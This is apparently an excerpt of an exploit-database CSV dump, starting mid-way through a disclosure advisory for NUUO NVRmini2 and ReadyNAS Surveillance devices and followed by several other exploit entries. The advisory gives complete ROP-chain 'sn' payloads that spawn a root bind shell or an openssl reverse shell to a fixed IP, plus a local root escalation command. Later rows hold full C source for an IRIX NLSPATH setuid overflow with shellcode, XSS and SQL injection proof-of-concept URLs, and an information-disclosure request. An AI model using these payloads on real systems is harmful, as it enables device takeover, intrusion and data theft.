aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  > A core file is generated: Core was generated by `/NUUO/bin/cgi_main'. Program terminated with signal SIGSEGV, Segmentation fault. #0  0x61616160 in ?? () (gdb) i r r0             0x0	0 r1             0x0	0 r2             0x407aa4d0	1081779408 r3             0x407aa9e0	1081780704 r4             0x61616161	1633771873 r5             0x61616161	1633771873 r6             0x61616161	1633771873 r7             0x61616161	1633771873 r8             0x331fc8	3350472 r9             0x1	1 r10            0x33db54	3398484 r11            0x0	0 r12            0x1	1 sp             0xbedce528	0xbedce528 lr             0x61616161	1633771873 pc             0x61616160	0x61616160 cpsr           0x60000030	1610612784 (gdb)   The request can be sent by an HTTP GET or POST method.  > A few registers can be controlled with the sn parameter, as it can be seen in the diagram below for the NVRmini2: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4444555566667777PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 976 4444: r4 register content, offset 962 5555: r5 register content, offset 966 6666: r6 register content, offset 970 7777: r7 register content, offset 974 SSSS: start of stack pointer, offset 992  > On the ReadyNAS Surveillance one additional register (r8) can be controlled: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa44445555666677778888PPPPaaaaaaaaaaaaSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS  aaaa: filler PPPP: pc / lr register content, offset 986 4444: r4 register content, offset 968 5555: r5 register content, offset 970 6666: r6 register content, offset 974 7777: r7 register content, offset 978 8888: r8 register content, offset 982 SSSS: start of stack pointer, offset 1002  > Exploit mitigations and constraints The table below shows the exploit mitigation technologies for each target:          NVRmini2   ReadyNAS NX          Y          Y RELRO    Partial    Partial ASLR        N          Y  An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).  > Exploitation in the NVRmini2 (firmware v3.0.0): This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.  0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget) 0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system) 0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it) Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 (""nc -l -p 4444 -e /bin/sh &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}  Exploit for NVRmini2 firmware v3.0.0 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26  Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.  > Exploitation on ReadyNAS Surveillance (version v1.1.2): To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).  The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used: 0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1) 0x00008690 : movs r0, r1 ; movs r0, r0 ; movs r2, r2 ; movs r2, r1 ; bx r7 -> located at B6CD6691 as this is a THUMB mode gadget (second gadget, sets up the arguments to system(), putting them into r0) 0xb6ef91bc: fixed system() address when B6CCE000 is chosen as the base address of libcrypto.so.0.9.8 (takes the argument from r0 - pointing to sp - and executes it) Payload: (in the stack) -> %6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26 (""mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.133.204:4444 > /tmp/s; rm /tmp/s &"")  Illustration: sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{second_gadget}{system_address}aaaa{first_gadget}aaaaaaaaaaaa{payload}  Exploit for ReadyNAS Surveillance v1.1.2 (""sn"" parameter value): sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%91%66%cd%b6%bc%91%ef%b6aaaa%9c%1d%d8%b6aaaaaaaaaaaa%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%73%3b%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3c%20%2f%74%6d%70%2f%73%20%32%3e%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26  Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.  It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.   >> Fix:  NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available. Do not expose any of these devices to the Internet or any networks with unstrusted hosts.  Timeline: 28.02.2016: Disclosure to CERT/CC. 27.04.2016: Requested status update from CERT - they did not receive any response from vendors. 06.06.2016: Requested status update from CERT - still no response from vendors.             Contacted Nuuo and NETGEAR directly. NETGEAR responded with their ""Responsible Disclosure Guidelines"", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo. 13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels. 07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure. 17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 04.08.2016: Coordinated disclosure with CERT.   >> References: [1] https://www.kb.cert.org/vuls/id/856152   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>",remote,remote,1
29477,Indexu 5.0/5.3 - 'upgrade.php?gateway' Cross-Site Scripting source: https://www.securityfocus.com/bid/22084/info  Indexu is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Indexu 5.3.0 and prior versions are vulnerable; other versions may also be affected.    http://www.example.com/INDEXU_PATH/upgrade.php?pflag=upgrade&true&gateway=[XSS],remote,webapps,1
23059,Netbula Anyboard 9.9.5 6 - Information Disclosure source: https://www.securityfocus.com/bid/8490/info  A vulnerability has been reported in Netbula Anyboard that may allow a remote attacker to gain access to sensitive data. This problem is due to an information disclosure issue that can be triggered by an attacker sending specific HTTP requests to a vulnerable host. This will result in sensitive information about the system being revealed to the attacker.  This vulnerability may allow an attack to gather sensitive information in order to launch further attacks against a vulnerable system.   http://www.example.com/cgi-bin/anyboard.cgi/?cmd=sinfo&all=1,remote,webapps,1
34227,"Qt 4.6.3 - Remote Denial of Service source: https://www.securityfocus.com/bid/41250/info  Qt is prone to a denial-of-service vulnerability caused by an infinite loop condition.  An attacker can exploit this issue to make the affected application unresponsive, denying service to legitimate users.  The issue affects Qt versions 4.6.3 and prior.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/34227.zip",remote,dos,1
19551,"UNICOS 9/MAX 1.3/mk 1.5 / AIX 4.2 / libc 5.2.18 / RedHat 4 / IRIX 6 / Slackware 3 - NLS (1) /* source: https://www.securityfocus.com/bid/711/info  Cray UNICOS 9.0/9.2/MAX 1.3/mk 1.5,AIX <= 4.2,Linux libc <= 5.2.18,RedHat 4.0,IRIX 6.2,Slackware 3.1 Natural Language Service (NLS) Vulnerability (1)     A buffer overflow condition affects libraries using the Natural Language Service (NLS). The NLS is the component of UNIX systems that provides facilities for customizing the natural language formatting for the system. Examples of the types of characteristics that can be set are language, monetary symbols and delimiters, numeric delimiters, and time formats.  Some libraries that use a particular environment variable associated with the NLS contain a vulnerability in which a buffer overflow condition can be triggered. The particular environment variable involved is NLSPATH on some systems and PATH_LOCALE on others.  It is possible to exploit this vulnerability to attain unauthorized access by supplying carefully crafted arguments to programs that are owned by a privileged user-id and that have setuid or setgid bits set.  */   /*## copyright LAST STAGE OF DELIRIUM sep 1997 poland        *://lsd-pl.net/ #*/ /*## libc.so $NLSPATH                                                        #*/  #define NOPNUM 768 #define ADRNUM 176 #define TMPNUM 200  char setreuidcode[]=     ""\x30\x0b\xff\xff""    /* andi    $t3,$zero,0xffff     */     ""\x24\x02\x04\x01""    /* li      $v0,1024+1           */     ""\x20\x42\xff\xff""    /* addi    $v0,$v0,-1           */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""\x30\x44\xff\xff""    /* andi    $a0,$v0,0xffff       */     ""\x31\x65\xff\xff""    /* andi    $a1,$t3,0xffff       */     ""\x24\x02\x04\x64""    /* li      $v0,1124             */     ""\x03\xff\xff\xcc""    /* syscall                      */ ;  char shellcode[]=     ""\x04\x10\xff\xff""    /* bltzal  $zero,<shellcode>    */     ""\x24\x02\x03\xf3""    /* li      $v0,1011             */     ""\x23\xff\x01\x14""    /* addi    $ra,$ra,276          */     ""\x23\xe4\xff\x08""    /* addi    $a0,$ra,-248         */     ""\x23\xe5\xff\x10""    /* addi    $a1,$ra,-240         */     ""\xaf\xe4\xff\x10""    /* sw      $a0,-240($ra)        */     ""\xaf\xe0\xff\x14""    /* sw      $zero,-236($ra)      */     ""\xa3\xe0\xff\x0f""    /* sb      $zero,-241($ra)      */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""/bin/sh"" ;  char jump[]=     ""\x03\xa0\x10\x25""    /* move    $v0,$sp              */     ""\x03\xe0\x00\x08""    /* jr      $ra                  */ ;  char nop[]=""\x24\x0f\x12\x34"";  main(int argc,char **argv){     char buffer[10000],adr[4],tmp[4],*b,*envp[2];     int i,n=-1;      printf(""copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n"");     printf(""libc.so $NLSPATH for irix 6.2 IP:17,19,20,21,22\n\n"");      if(argc!=2){         printf(""usage: %s {login|who|netprint|ordist|cancel|route|""             ""at}\n"",argv[0]);         exit(-1);     }     if(!strcmp(argv[1],""login"")) n=0;     if(!strcmp(argv[1],""who"")) n=1;     if(!strcmp(argv[1],""netprint"")) n=2;     if(!strcmp(argv[1],""ordist"")) n=3;     if(!strcmp(argv[1],""cancel"")) n=4;     if(!strcmp(argv[1],""route"")) n=5;     if(!strcmp(argv[1],""at"")) n=6;     if(n==-1) exit(-1);      *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+8492+1800;     *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+8492-1024;      envp[0]=buffer;     envp[1]=0;      b=buffer;     sprintf(b,""NLSPATH="");     b+=8;     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i];      for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];      *b++=0xff;     for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];     for(i=0;i<ADRNUM;i++) *b++=adr[i%4];     *b=0;      switch(n){     case 0: execle(""/bin/login"",""lsd"",0,envp);     case 1: execle(""/sbin/who"",""lsd"",0,envp);     case 2: execle(""/usr/lib/print/netprint"",""lsd"",0,envp);     case 3: execle(""/usr/bsd/ordist"",""lsd"",0,envp);     case 4: execle(""/usr/bin/cancel"",""lsd"",0,envp);     case 5: execle(""/usr/etc/route"",""lsd"",""add"",0,envp);     case 6: execle(""/usr/bin/at"",""lsd"",""bzz"",0,envp);     } }",local,local,1
45511,"Singleleg MLM Software 1.0 - 'msg_id' SQL Injection # Exploit Title: Singleleg MLM Software 1.0 - 'msg_id' SQL Injection # Dork: N/A # Date: 2018-10-01 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://mlmsoftwarez.in/ # Software Link: http://mlmdemo.biz/singleleg/root.html # Software Link: http://mlmdemo.biz/autopool/root.html # Software Link: http://mlmdemo.biz/gift/root.html # Software Link: http://mlmdemo.biz/investment/root.html # Software Link: http://mlmdemo.biz/bidding/root.html # Software Link: http://mlmdemo.biz/adclicking/root.html # Software Link: http://mlmdemo.biz/repurchase/root.html # Software Link: http://mlmdemo.biz/moneyorderplan/root.html # Software Link: http://mlmdemo.biz/level/root.html # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # Affected Products: Singleleg MLM Software 1.0, Autopool MLM Software 1.0, Gift MLM Software 1.0 # Investmen MLM Software 1.0, Bidding MLM Software 1.0, ADD Clicking MLM Software 1.0 # Repurchase MLM Software 1.0, Moneyorder MLM Software 1.0, Level MLM Software 1.0 # CVE: N/A  # POC:  # http://localhost/[PATH]/member/readmsg.php?msg_id=[SQL]  